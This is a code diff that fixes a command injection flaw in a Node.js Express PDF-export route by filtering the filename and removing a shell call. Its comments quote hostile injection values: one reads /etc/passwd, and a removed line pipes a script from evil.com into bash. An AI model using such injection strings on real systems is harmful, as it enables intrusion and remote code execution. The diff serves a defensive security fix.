@@ -44,17 +44,17 @@ router.post('/query', (req, res) => {
 // GET /api/export/pdf?filename=report;cat /etc/passwd
 router.get('/pdf', (req, res) => {
   const { filename } = req.query;
-  const reportName = filename || 'transaction-report';
+  // Sanitize filename by allowing only alphanumeric, dash, underscore, and dot characters
+  const sanitizedFilename = (filename || 'transaction-report').replace(/[^a-zA-Z0-9-_\.]/g, '');
 
   try {
-    // VULNERABLE: User input directly in shell command
-    // Attacker: ?filename=report;curl http://evil.com/shell.sh|bash
-    const command = `echo "Generating PDF: ${reportName}" && date`;
-    const output = execSync(command, { encoding: 'utf-8', timeout: 5000 });
+    // FIXED: Removed direct shell command execution with user input to prevent command injection
+    // Instead, simulate PDF generation logic safely without shell commands
+    const output = `Generating PDF: ${sanitizedFilename}\n${new Date().toString()}`;
 
     res.json({
       success: true,
-      message: `PDF export initiated for: ${reportName}`,
+      message: `PDF export initiated for: ${sanitizedFilename}`,
       debug: output,
     });
   } catch (err) {
